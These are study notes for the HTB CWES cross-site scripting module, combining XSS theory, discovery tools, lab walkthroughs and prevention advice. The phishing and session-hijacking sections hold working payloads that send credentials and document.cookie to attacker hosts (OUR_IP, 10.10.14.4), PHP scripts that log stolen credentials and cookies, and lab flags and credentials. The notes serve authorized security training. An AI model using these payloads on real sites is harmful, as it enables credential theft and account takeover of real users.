---
tags:
  - CWES
  - HTB
  - cybersecurity
xmind_sheet: "1"
source_file: "CWES.xmind"
---

# Cross-Site Scripting (XSS)

## Study Companion

### Prerequisites

HTML, JavaScript, DOM basics, and HTTP request analysis.

### Learning Outcomes

- Classify stored, reflected, DOM-based, and blind XSS.
- Trace attacker-controlled sources to context-specific browser sinks.
- Validate execution safely and recommend contextual encoding and safe DOM APIs.

### Practice Checkpoint

For one authorized input, record its source, output context, sink, execution condition, and minimal proof.

### Related Knowledge Map

- [[Maps/Client-side Security|Client-side Security]]
- [[Study Group Guide|CWES Study Group Guide]]

> [!info] Source
> Converted from the CWES XMind mind map. Topic hierarchy, notes, links, and embedded images were preserved.

## Professional Guidance

### Objective
Identify stored, reflected, DOM-based, and blind XSS in authorized applications, trace attacker-controlled sources to executable browser sinks, and demonstrate business impact with controlled proofs while avoiding harm to real users or sessions.

### Assessment Workflow
1. Inventory every input channel, including form fields, URL/query/fragment values, headers, cookies, and administrative workflows.
2. Submit a unique marker and determine whether it is stored, reflected in an HTTP response, or processed only in the DOM; use Network, page source, and client-side code to classify it.
3. Inspect output context and trace JavaScript sources to dangerous sinks such as `innerHTML`, `outerHTML`, `document.write`, and risky jQuery DOM methods.
4. Confirm execution with a benign payload appropriate to the context, using `window.origin` or an equivalent marker to verify the actual origin and iframe boundary.
5. For blind workflows, use field-specific callback paths to identify the vulnerable field, and stop at controlled callback confirmation unless deeper impact is explicitly authorized.
6. Review front-end and back-end encoding, sanitization, CSP, cookie flags, and framework protections, then retest after remediation.

### Key Testing Principles
- Match payloads to HTML, attribute, JavaScript, URL, and DOM contexts; a blocked `<script>` tag does not prove safety.
- Differentiate persistence and victim interaction requirements because they materially affect severity.
- Use automated scanners to broaden coverage, but rely on manual rendering analysis and code review for confirmation.
- Treat defacement, credential capture, and session hijacking examples as impact scenarios for isolated HTB labs, not default production proofs.
- Favor contextual output encoding, safe DOM APIs, DOMPurify where appropriate, CSP, and `HttpOnly`, `Secure`, and suitable `SameSite` cookie attributes.

### Evidence and Reporting
Include the exact source, sink, rendering context, payload, request/response or DOM trace, execution origin, persistence, affected roles, and required victim action. Capture a benign screenshot or callback log, describe realistic impact, remove test data, and provide context-specific remediation rather than generic input filtering advice.

<!-- BEGIN XMIND OUTPUTS -->
## XMind Outputs

> [!output] 🟨 Yellow means output
> The source XMind contains **19 yellow/output topics** in this module.

- [[Outputs/Modules/Cross-Site Scripting (XSS) Outputs|Open the verified output list]]
<!-- END XMIND OUTPUTS -->

## Complete Technical Reference

## XSS Attacks

### 2005

- <https://en.wikipedia.org/wiki/Samy_(computer_worm)>
### 2014

- <https://blog.sucuri.net/2014/06/serious-cross-site-scripting-vulnerability-in-tweetdeck-twitter.html>
### 2019

- Google's
  - <https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/>
    - <noscript><p title="</noscript><img src=x onerror=alert(1)>">
## Types of XSS

### Stored (Persistent) XSS

- posts
- comments
### Reflected (Non-Persistent) XSS

- search result
- error message
### DOM-based XSS

- completely processed on the client-side
  - HTTP parameters
  - anchor tags
## blacklisting consideration

### <script>alert(window.origin)</script>

- Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of window.origin in the alert box, instead of a static value like 1.
  - In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used.
### As some modern browsers may block the

- alert()
- print()
## Stored XSS

### <script>alert(window.origin)</script>

- refresh the page and see whether we get the alert again. If we do, we would see that we keep getting the alert even throughout page refreshes, confirming that this is indeed a Stored/Persistent XSS
## Reflected XSS

### To-Do List app

- try adding any test string to see how it's handled:
  - Task 'test' could not be added.
    - our input test as part of the error message.
      - <script>alert(window.origin)</script>
### how would we target victims with it?

- depends on which HTTP request
  - [CTRL+Shift+I] and selecting the Network tab.
    - our request was a GET request.
      - Copy>Copy URL.
## DOM XSS

### Developer Tools

- Network
  - if we open the Network tab in the Firefox Developer Tools, and re-add the test item, we would notice that no HTTP requests are being made:
    - the input parameter in the URL is using a hashtag # for the item we added, which means that this is a client-side parameter
      - completely processed on the browser.
        - hence it is a DOM-based XSS.
- CTRL U
  - our test string is nowhere to be found.
### Source & Sink

- Source
  - JavaScript object that takes the user input
    - URL parameter
    - input field
- Sink
  - function that writes the user input to a DOM Object
    - Some of the commonly used JavaScript functions
      - document.write()
      - DOM.innerHTML
      - DOM.outerHTML
    - jQuery
      - add()
      - after()
      - append()
- inspect script.js in the example
  - We can look at the source code of the To-Do web application, and check script.js, and we will see that the Source is being taken from the task= parameter:
    - var pos = document.URL.indexOf("task=");
    - var task = document.URL.substring(pos + 5, document.URL.length);
  - Right below these lines, we see that the page uses the innerHTML function to write the task variable in the todo DOM:
    - document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
      - So, we can see that we can control the input, and the output is not being sanitized, so this page should be vulnerable to DOM XSS.
      - innerHTML function does not allow the use of the <script> tags within it
### DOM Attacks

- XSS payloads we use that do not contain <script> tags
  - <img src="" onerror=alert(window.origin)>
  - <img src ='' onerror=alert(document.cookie)>
## XSS Discovery

### Automated Discovery

- Nessus
- Burp Pro
- ZAP
- common open-source tools
  - <https://github.com/s0md3v/XSStrike>
    - cd XSStrike
      - pip install -r requirements.txt
        - python xsstrike.py
          - python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
            - [!] Testing parameter: password  
              [-] No reflection found  
              [!] Testing parameter: email  
              [!] Reflections found: 1  
              [+] Payload: <HtMl%09onPoIntERENTER+=+confirm()>
  - <https://github.com/rajeshmajumdar/BruteXSS>
  - <https://github.com/epsylon/xsser>
### Manual Discovery

- identifying advanced XSS vulnerabilities requires advanced code review skills.
- testing various XSS payloads against an input field
- XSS Payloads
  - <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md>
  - <https://github.com/payloadbox/xss-payload-list>
- XSS can be injected into
  - any input in the HTML page
  - HTTP headers
    - Cookie
    - User-Agent
- may be more efficient to write our own Python script to automate sending these payloads and then comparing the page source to see how our payloads were rendered.
### Code Review

- both back-end and front-end code.
- manual code review may reveal undetected XSS vulnerabilities by SAST tool
- Advanced technique
  - <https://academy.hackthebox.com/course/preview/secure-coding-101-javascript>
  - <https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection>
## Defacing

### usually used with stored XSS

### Four HTML elements are usually utilized to change the main look of a web page:

- Background Color document.body.style.background
- Background document.body.background
- Page Title document.title
- Page Text DOM.innerHTML
### Changing Background

- <script>document.body.style.background = "#141d2b"</script>
- <script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
### Changing Page Title

- <script>document.title = 'HackTheBox Academy'</script>
### Changing Page Text

- document.getElementById("todo").innerHTML = "New Text"
- utilize jQuery functions for more efficiently
  - $("#todo").html('New Text');
- change the entire HTML code of the main body, using innerHTML
  - document.getElementsByTagName('body')[0].innerHTML = "New Text"
- borrow the HTML code from the main page of Hack The Box Academy:
  - our HTML
    - <center>  
      <h1 style="color: white">Cyber Security Training</h1>  
      <p style="color: white">by  
      <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy">  
      </p>  
      </center>
  - We will minify the HTML code into a single line and add it to our previous XSS payload. The final payload should be
    - <script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
### result total changing HTML code

- <div></div><ul class="list-unstyled" id="todo"><ul>  
  <script>document.body.style.background = "#141d2b"</script>  
  </ul><ul><script>document.title = 'HackTheBox Academy'</script>  
  </ul><ul><script>document.getElementsByTagName('body')[0].innerHTML = '...SNIP...'</script>  
  </ul></ul>
## Phishing

### injecting fake login forms that send the login details to the attacker's server

### XSS Discovery

- find working paylod
### Login Form Injection

- To write HTML code to the vulnerable page, we can use the JavaScript function document.write()
  - <h3>Please login to continue</h3>  
    <form action=http://OUR_IP>  
    <input type="username" name="username" placeholder="Username">  
    <input type="password" name="password" placeholder="Password">  
    <input type="submit" name="submit" value="Login">  
    </form>
    - HTML as single line
      - document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
    - and we listening on our machine to get the credentials
- so the URL should be
  - http://SERVER_IP/phishing/index.php?url=...SNIP...
- Cleaning Up
  > We can see that the URL field is still displayed, which defeats our line of "Please login to continue". So, to encourage the victim to use the login form, we should remove the URL field, such that they may think that they have to log in to be able to use the page. To do so, we can use the JavaScript function document.getElementById().remove() function.
  - find the id of the HTML element we want to remove
    - Inspector
      - clicking on the element we need
        - <form id="urlform" role="form" action="index.php" method="GET">
          - after the document.write function
            - document.getElementById('urlform').remove();
              - we can use this new JavaScript code in our payload:
                - document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
                  - When we try to inject our updated JavaScript code, we see that the URL form is indeed no longer displayed:
                    - We also see that there's still a piece of the original HTML code left after our injected login form. This can be removed by simply commenting it
- Credential Stealing
  - listening
    - netcat
      - sudo nc -lvnp 80
        - Now, let's attempt to login with the credentials test:test
        - will not handle the HTTP request
        - but we got the crednetials
          - GET /?username=test&password=test&submit=Login HTTP/1.1
    - basic PHP script to handle login and redirect
      - /tmp/tmpserver/index.php
        - <?php  
          if (isset($_GET['username']) && isset($_GET['password'])) {  
          $file = fopen("creds.txt", "a+");  
          fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");  
          header("Location: http://SERVER_IP/phishing/index.php");  
          fclose($file);  
          exit();  
          }  
          ?>
      - PHP listening server
        - sudo php -S 0.0.0.0:80
      - check the creds.txt
- LAB
  - XSS Discover
    - run XSSstrike to get the working paylaod
      - python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
        - '><html/+/ONMoUsEoVEr+=+[8].find(confirm)%0dx//
  - Deface the web page with the login form and redirect to /phishing/send.php if success
    - '><html/+/document.write('<h3>Please login to continue</h3><form action=http://10.10.14.4:8081><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form> <!--
      - the webpage is now login form
  - set php server to handle the credentials
    - mkdir server ; cd server
      - nano index.php
        - <?php  
          if (isset($_GET['username']) && isset($_GET['password'])) {  
          // Append credentials to creds.txt safely  
          $line = "Username: {$_GET['username']} | Password: {$_GET['password']}\n";  
          file_put_contents("creds.txt", $line, FILE_APPEND | LOCK_EX);  
          // Redirect to the send.php page  
          header("Location: http://10.129.234.166/phishing/send.php");  
          exit();  
          }  
          ?>
    - sudo php -S 0.0.0.0:8081
  - User enter the credentials in the login form
    - they redirected to send.php
      - enter URL to send to it  
        [     ]
        - send the modified URL with the login
          - http://10.129.234.166/phishing/index.php?url=%27%3E%3Chtml%2F%2B%2Fdocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.14.4%3A8081%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E+%3C%21--
            - URL sent
    - cat creds.txt
      - Username: admin | Password: p1zd0nt57341myp455
  - Login with admin user
    - /phishing/login.php
      - got the Flag
## Session Hijacking

### Blind XSS Detection

- e.g., Admins
  - we will not see how our input will be handled or how it will look in the browser since it will appear for the Admin only
- issues
  - How can we know which specific field is vulnerable?
  - How can we know what XSS payload to use?
- Loading a Remote Script
  - <script src="http://OUR_IP/script.js"></script>
    - We can change the requested script name from script.js to the name of the field we are injecting in
      - <script src="http://OUR_IP/username"></script>
        - If we get a request for /username, then we know that the username field is vulnerable to XSS
          - start testing various XSS payloads that load a remote script and see which of them sends us a request
            - <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss>
              - <script src=http://OUR_IP></script>
              - '><script src=http://OUR_IP></script>
              - "><script src=http://OUR_IP></script>
              - javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
              - <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
              - <script>$.getScript("http://OUR_IP")</script>
            - if we had access to the source code (i.e., in a DOM XSS)
  - start a listener
    - netcat
    - php
      - sudo php -S 0.0.0.0:80
  - send these as test
    - <script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
    - <script src=http://OUR_IP/username></script> #this goes inside the username field
- Once we find a working XSS payload and have identified the vulnerable input field, we can proceed to XSS exploitation and perform a Session Hijacking attack.
  - JavaScript payloads we can use to grab the session cookie
    - <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc>
      - document.location='http://OUR_IP/index.php?c='+document.cookie;
      - new Image().src='http://OUR_IP/index.php?c='+document.cookie;
    - script.js
      - one of the pervious 2
        - new Image().src='http://OUR_IP/index.php?c='+document.cookie
    - paylaod
      - <script src=http://OUR_IP/script.js></script>
- prepare php file to sort and seperate the cookies (if multiple)
  - index.php
    - <?php  
      if (isset($_GET['c'])) {  
      $list = explode(";", $_GET['c']);  
      foreach ($list as $key => $value) {  
      $cookie = urldecode($value);  
      $file = fopen("cookies.txt", "a+");  
      fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");  
      fclose($file);  
      }  
      }  
      ?>
      - wait for the victim to visit the vulnerable page and view our XSS payload
        - 10.10.10.10:52798 [200]: /script.js  
          10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
        - cat cookies.txt
          - Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
- Change the Cookie
  - open Developer tool
    - Storage
      - click on the +
        - Name = cookie
        - Value = f904f93c949d19d870911bf8b05fe7b2
  - refresh the page
    - we have access
- LAB
  - sudo php -S 0.0.0.0:8080
  - website has registeration form 5 inputs
    - use many XSS to all of them untill we got Log to our PHP Server
      - found one
        - "><script src=http://10.10.14.4:8080/></script>
          - [200]: GET /
          - specify which input field has the vulnerability
            - "><script src=http://10.10.14.4:8080/fullname></script>
            - "><script src=http://10.10.14.4:8080/username></script>
            - "><script src=http://10.10.14.4:8080/pass></script>
            - test@test.com
            - "><script src=http://10.10.14.4:8080/image></script>
              - got Log
                - [200]: GET /img
  - prepare php files to steal cookie
    - script.js
      - new Image().src='http://OUR_IP/index.php?c='+document.cookie;
        - didnt work
    - script2.js
      - document.location='http://10.10.14.4:8080/index.php?c='+document.cookie;
    - index.php
      - same as above
  - now send the payload
    - "><script src=http://10.10.14.4:8080/script2.js></script>
      - we got the logs
        - [200]: GET /script2.js  
          [200]: GET /index.php?c=cookie=c00k1355h0u1d8353cu23d
          - cat cookies.txt
            - Victim IP: 10.129.234.166 | Cookie: cookie=c00k1355h0u1d8353cu23d
    - use cookie editor extension
      - Add
        - name = cookie
        - value = c00k1355h0u1d8353cu23d
      - Save
    - visit /hijacking/login.php
      - Flag
## XSS Prevention

### Front-end

- Input Validation
  - <https://github.com/cure53/DOMPurify>
    - <script type="text/javascript" src="dist/purify.min.js"></script>
    - let clean = DOMPurify.sanitize( dirty );
      > prevent vulnerabilities like DOM XSS.
  - never use user input directly within certain HTML tags
    - JavaScript code <script></script>
    - CSS Style Code <style></style>
    - Tag/Attribute Fields <div name='INPUT'></div>
    - HTML Comments <!-- -->
  - avoid using JavaScript functions that allow changing raw text of HTML
    - HTML
      - DOM.innerHTML
      - DOM.outerHTML
      - document.write()
      - document.writeln()
      - document.domain
    - jQuery
      - html()
      - parseHTML()
      - add()
      - append()
      - prepend()
      - after()
      - insertAfter()
      - before()
      - insertBefore()
      - replaceAll()
      - replaceWith()
### Back-end

- Input Validation
- Input Sanitization
  - PHP back-end, we can use the addslashes function to sanitize user input by escaping special characters with a backslash:
- NodeJS back-end
  - <https://github.com/cure53/DOMPurify>
    - import DOMPurify from 'dompurify';
    - var clean = DOMPurify.sanitize(dirty);
- Output HTML Encoding
  - NodeJS back-end
    - html-entities library
      - import encode from 'html-entities';
      - encode('<'); // -> '&lt;'
- Server Configuration
  - Using XSS prevention headers.
  - Using the appropriate Content-Type for the page, like X-Content-Type-Options=nosniff.
  - Using Content-Security-Policy options, like script-src 'self', which only allows locally hosted scripts.
  - Using the HttpOnly and Secure cookie flags to prevent JavaScript from reading cookies and only transport them over HTTPS.
  - good Web Application Firewall (WAF)
- frameworks provide built-in XSS protection
  - ASP.NET
## Skills Assessment

### Identify a user-input field that is vulnerable to an XSS vulnerability

- use the wordlists on all input feild
  - "><script src="http://10.10.14.4:8089"></script>
    - this worked
  - '><script src="http://10.10.14.4:8089"></script>
  - <script src="http://10.10.14.4:8089"></script>
  - javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.14.4:8089\';document.body.appendChild(a)')
  - <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.14.4:8089");a.send();</script>
  - <script>$.getScript("http://10.10.14.4:8089")</script>
- which input feild
  - "><script src="http://10.10.14.4:8089/comment"></script>
  - "><script src="http://10.10.14.4:8089/name"></script>
  - "><script src="http://10.10.14.4:8089/website"></script>
    - this worked
### Find a working XSS payload that executes JavaScript code on the target's browser

- index.php
  - <?php  
    if (isset($_GET['c'])) {  
    $list = explode(";", $_GET['c']);  
    foreach ($list as $key => $value) {  
    $cookie = urldecode($value);  
    $file = fopen("cookies.txt", "a+");  
    fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");  
    fclose($file);  
    }  
    }  
    ?>
- script.js
  - document.location='http://10.10.14.4:8089/index.php?c='+document.cookie;
- script2.js
  - new Image().src='http://10.10.14.4:8089/index.php?c='+document.cookie;
    - this worked
### Using the Session Hijacking techniques, try to steal the victim's cookies, which should contain the flag

- now the payload should be sent on Website input field
  - "><script src="http://10.10.14.4:8089/script2.js"></script>
- we got in our php server the cookie
  - GET /index.php?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1762512134;%20flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
